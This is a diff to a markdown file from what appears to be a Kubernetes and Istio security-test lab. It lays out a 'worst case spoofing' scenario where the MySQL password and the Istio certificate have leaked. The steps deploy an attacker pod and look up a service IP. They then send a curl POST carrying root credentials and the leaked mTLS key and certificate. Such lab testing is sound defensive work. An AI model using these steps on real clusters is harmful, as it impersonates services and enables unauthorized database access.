@@ -1,3 +1,16 @@
 # Worse Case Spoofing(Already Password and Certificate Leaked)
 
 (TODO)
+
+# Overview
+  This document tell you about worse case spoofing.
+  In this case, MySQL DB password and Istio certificate are leaked.
+
+# Steps
+  cd /path/to/sectest/apps/attacker
+  *) kubectl delete -f attacker.yaml
+  kubectl apply -f attacker_istio.yaml
+  kubectl exec -it attacker bash -n dangerarea
+  nslookup mysql-apiserver.default.svc.cluster.local 10.96.0.10
+  *) save ip address as <svc-ip>
+  curl -k -XPOST https://<svc-ip>:4567/api -d '{"user":"root", "password":"ossj_sectest"}' --key /etc/certs/key.pem  --cert /etc/certs/cert-chain.pem
